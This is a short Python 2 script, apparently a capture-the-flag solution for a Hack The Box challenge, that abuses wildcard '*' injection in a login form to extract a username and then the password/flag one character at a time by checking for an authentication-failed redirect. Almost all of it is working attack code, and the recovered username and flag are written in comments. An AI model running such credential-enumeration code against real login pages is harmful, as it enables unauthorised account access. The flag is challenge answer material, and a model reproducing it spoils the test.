#http://206.189.115.160:31453/login
#'*' can pass the login

import requests
import string

url = 'http://206.189.115.160:31453/login'
#data = {'username': '*', 'password': '*'}
#data = {'username': '1', 'password': '*'}

#x = requests.post(url, data = data)
#if 'Authentication%20failed' in x.url:
#	print 'Failed'

chars = string.ascii_letters
chars += ''.join(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '`', '~', '!', '@', '$', '%', '&', '-', '_', "'"])

#Detect username:

def detect_username():
	name0 = ''
	passwd = '*'
	while True:
		flag = 0
		for c in chars:
			name = name0+c+'*'
			print name
			data = {'username': name, 'password': passwd}
			x = requests.post(url, data = data)
			if 'Authentication%20failed' in x.url:
				continue
			else:
				name0 = name0+c
				flag = 1
				break
		if flag == 0:
			print name0
			break

#detect_username()
#reese

def detect_passwd():
	name = 'reese'
	passwd0 = 'HTB{'
	while True:
		flag = 0
		for c in chars:
			passwd = passwd0+c+'*'
			print passwd
			data = {'username': name, 'password': passwd}
			x = requests.post(url, data = data)
			if 'Authentication%20failed' in x.url:
				continue
			else:
				passwd0 = passwd0+c
				flag = 1
				break
		if flag == 0:
			print passwd0
			break

detect_passwd()
#HTB{d1rectory_h4xx0r_is_k00l}
